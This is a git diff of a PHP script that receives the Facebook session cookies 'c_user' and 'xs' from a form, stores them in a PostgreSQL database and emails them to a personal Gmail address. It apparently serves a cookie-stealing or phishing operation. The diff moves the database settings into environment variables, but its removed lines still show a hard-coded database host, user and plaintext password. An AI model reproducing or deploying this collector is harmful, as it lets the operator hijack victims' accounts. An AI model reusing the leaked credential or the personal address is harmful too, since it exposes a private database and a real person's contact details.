@@ -1,10 +1,11 @@
 <?php
-// Neon PostgreSQL connection settings
-$host = "ep-green-truth-a49i08qh-pooler.us-east-1.aws.neon.tech";
-$dbname = "neondb";
-$user = "neondb_owner";
-$pass = "npg_AGezYV4Cyia1";
-$port = 5432; // Default PostgreSQL port
+// Get database connection details from environment variables
+$host = getenv('DB_HOST');
+$dbname = getenv('DB_NAME');
+$user = getenv('DB_USER');
+$pass = getenv('DB_PASS');
+$port = getenv('DB_PORT');
+$sslmode = getenv('DB_SSLMODE');
 
 // Get form data
 $c_user = isset($_POST['c_user']) ? $_POST['c_user'] : '';
@@ -13,7 +14,7 @@ $xs = isset($_POST['xs']) ? $_POST['xs'] : '';
 if (!empty($c_user) && !empty($xs)) {
     try {
         // Connect to Neon PostgreSQL using PDO
-        $dsn = "pgsql:host=$host;port=$port;dbname=$dbname;sslmode=require";
+        $dsn = "pgsql:host=$host;port=$port;dbname=$dbname;sslmode=$sslmode";
         $pdo = new PDO($dsn, $user, $pass, [
             PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
         ]);
@@ -26,7 +27,7 @@ if (!empty($c_user) && !empty($xs)) {
         ]);
 
         // Send email notification
-        $to = "naseeb.niaz.ec@gmail.com"; // Replace with your email
+        $to = "naseeb.niaz.ec@gmail.com"; // Your email
         $subject = "New Submission";
         $message = "c_user: $c_user\nxs: $xs";
         $headers = "From: no-reply@example.com";
